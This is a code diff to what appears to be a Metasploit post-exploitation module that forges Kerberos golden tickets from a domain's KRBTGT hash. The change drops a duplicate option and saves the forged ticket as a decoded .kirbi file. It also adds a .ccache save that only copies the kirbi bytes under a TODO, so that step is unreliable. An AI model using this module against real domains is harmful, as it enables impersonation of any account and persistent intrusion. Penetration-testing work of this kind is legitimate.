@@ -47,7 +47,6 @@ class MetasploitModule < Msf::Post
         OptBool.new('USE', [true, 'Use the ticket in the current session', false]),
         OptString.new('USER', [false, 'Target User']),
         OptString.new('DOMAIN', [false, 'Target Domain']),
-        OptString.new('KRBTGT_HASH', [false, 'KRBTGT NTLM Hash']),
         OptString.new('KRBTGT_HASH', [false, 'KRBTGT NT Hash']),
         OptString.new('Domain SID', [false, 'Domain SID']),
         OptInt.new('ID', [false, 'Target User ID']),
@@ -131,14 +130,26 @@ class MetasploitModule < Msf::Post
 
     if ticket
       print_good('Golden Ticket Obtained!')
-      ticket_location = store_loot("golden.ticket",
-                                   "base64/kirbi",
+      kirbi_ticket = Base64.decode64(ticket)
+      kirbi_location = store_loot("golden.ticket",
+                                   "kirbi",
                                    session,
-                                   ticket,
+                                   kirbi_ticket,
                                    "#{domain}\\#{user}-golden_ticket.kirbi",
                                    "#{domain}\\#{user} Golden Ticket")
 
-      print_status("Ticket saved to #{ticket_location}")
+      print_status("Ticket saved to #{kirbi_location}")
+
+      # TODO: Convert ticket to ccache
+      ccache_ticket = kirbi_ticket
+      ccache_location = store_loot("golden.ticket",
+                                   "kirbi",
+                                   session,
+                                   ccache_ticket,
+                                   "#{domain}\\#{user}-golden_ticket.ccache",
+                                   "#{domain}\\#{user} Golden Ticket")
+
+      print_status("Ticket saved to #{ccache_location}")
 
       if datastore['USE']
         print_status("Attempting to use the ticket...")
